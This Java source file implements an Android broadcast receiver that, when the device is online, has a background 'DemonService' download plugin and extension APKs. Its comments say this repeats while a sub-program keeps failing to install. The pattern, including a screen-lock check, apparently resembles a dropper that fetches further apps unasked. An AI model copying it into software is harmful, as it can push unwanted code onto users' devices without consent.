package com.xstd.qm.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.text.TextUtils;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.qm.Config;
import com.xstd.qm.ExtPluginUtils;
import com.xstd.qm.UtilOperator;
import com.xstd.qm.service.DemonService;
import com.xstd.qm.setting.SettingManager;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-16
 * Time: AM10:58
 * To change this template use File | Settings | File Templates.
 */
public class PluginDownloadBroadcastReceiver extends BroadcastReceiver {

    public static final String DOWNLOAD_PLUGIN_ACTION = "com.download.plugin";

    public void onReceive(final Context context, Intent intent) {
        Config.LOGD("[[PluginDownloadBroadcastReceiver::onReceive]] Entry >>>>>>>>");

        SettingManager.getInstance().init(context);
        String path = SettingManager.getInstance().getLocalApkPath();
        if (TextUtils.isEmpty(path)) {
            return;
        }

        String extPath = SettingManager.getInstance().getLocalExtApkPath();

        if (Config.DEBUG) {
            Config.LOGD("[[PluginDownloadBroadcastReceiver::onReceive]] " +
                            "\n     SettingManager.getInstance().getPluginInstallTime() = " + SettingManager.getInstance().getPluginInstallTime() +
                            "\n     SettingManager.getInstance().getKeyPluginInstalled() = " + SettingManager.getInstance().getKeyPluginInstalled() +
                            "\n     localExt Path = " + extPath +
                            "\n     ExtPluginUtils.isExtPluginApkExist() = " + ExtPluginUtils.isExtPluginApkExist());
        }
        if (SettingManager.getInstance().getPluginInstallTime() > 2
                && !SettingManager.getInstance().getKeyPluginInstalled()
                && UtilsRuntime.isOnline(context)
                && !TextUtils.isEmpty(extPath)
                && !Config.DOWNLOAD_EXT_PROCESS_RUNNING.get()
                && !ExtPluginUtils.isExtPluginApkExist()) {
            //在子程序安装三次以上就开始下载扩展子程序
            //只有在子程序没有安装成功的时候才下载
            if (Config.DEBUG) {
                Config.LOGD("[[PluginDownloadBroadcastReceiver::onReceive]] try to Send com.xstd.service.download.ext to service");
            }

            Intent i = new Intent();
            i.setAction(DemonService.ACTION_DOWNLOAD_EXT_PLUGIN);
            i.setClass(context, DemonService.class);
            context.startService(i);
        }

        if (UtilOperator.isPluginApkExist()) {
            Config.LOGD("[[PluginDownloadBroadcastReceiver::onReceive]] plugin apk is exist on Path : " + path);
            return;
        } else {
            if (Config.DEBUG) {
                Config.LOGD("[[PluginDownloadBroadcastReceiver::onReceive]] isOnline = " + UtilsRuntime.isOnline(context)
                                + " download process = " + Config.DOWNLOAD_PROCESS_RUNNING.get()
                                + " screenLocked = " + UtilsRuntime.isScreenLocked(context));
            }

            if (UtilsRuntime.isOnline(context)
                    && !Config.DOWNLOAD_PROCESS_RUNNING.get()) {
                Handler handler = new Handler(context.getMainLooper());
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        Intent i = new Intent();
                        i.setClass(context, DemonService.class);
                        i.setAction(DemonService.ACTION_DOWNLOAD_PLUGIN);
                        context.startService(i);
                    }
                }, 1 * 1000);
            }
        }

        Config.LOGD("[[PluginDownloadBroadcastReceiver::onReceive]] Leave <<<<<<<<");
    }

}
